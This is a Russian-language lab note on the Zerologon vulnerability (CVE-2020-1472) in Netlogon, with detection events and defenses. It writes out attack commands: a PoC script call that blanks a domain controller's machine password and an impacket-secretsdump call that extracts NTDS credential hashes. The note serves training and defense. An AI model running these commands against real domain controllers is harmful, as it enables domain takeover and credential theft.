# Zerologon (CVE-2020-1472)

## 🎯 Цель атаки
Эксплуатировать уязвимость в протоколе Netlogon, чтобы сбросить пароль машинной учётной записи контроллера домена и получить доступ к AD.

## 📋 Описание
Уязвимость позволяет установить защищённый канал Netlogon с нулевым вектором инициализации, что приводит к обходу аутентификации.  
После успешной эксплуатации злоумышленник может сбросить пароль DC и извлечь секреты из NTDS.

## ⚠ Условия эксплуатации
- DC без патча от августа–ноября 2020 (в учебном стенде).
- Доступ к DC по 135/445 (RPC/SMB).

## 🔹 Пошагово в лаборатории
> ⚠ Только в изолированной среде! После теста восстановите пароль DC.

1. **Эксплуатация Zerologon** (примерный PoC):
```bash
python3 set_empty_pw.py DC-NAME 10.0.0.10
```
2. **Извлечение секретов NTDS через Impacket**:
```bash
impacket-secretsdump -hashes :<ntlm_hash> 'LAB/DC-NAME$@10.0.0.10'
```
3. **Восстановление пароля машинного аккаунта DC** (обязательно).

## 📊 Признаки в логах и мониторинг
- Аномальные Netlogon‑сессии, сбои аутентификации.
- Изменение пароля учётки компьютера DC.
- 4624/4625 с нетипичных хостов, 4742 (изменение компьютерной учётной записи).

## 🛡 Меры защиты
- Установить обновления безопасности (2020) и включить Enforced mode.
- Ограничить доступ к Netlogon только доверенным хостам.
- Мониторить события 4742, Netlogon‑аномалии.

## 🔍 Разбор команд

### 1. Эксплуатация PoC
```bash
python3 set_empty_pw.py DC-NAME 10.0.0.10
```
- **`set_empty_pw.py`** — PoC‑скрипт, выполняющий атаку.
- **`DC-NAME`** — NetBIOS‑имя контроллера домена.
- **`10.0.0.10`** — IP DC.

### 2. Извлечение секретов Impacket
```bash
impacket-secretsdump -hashes :<ntlm_hash> 'LAB/DC-NAME$@10.0.0.10'
```
- **`-hashes :<ntlm_hash>`** — NTLM‑хэш машинной учётки после сброса.
- **`LAB/DC-NAME$`** — формат учётки компьютера.
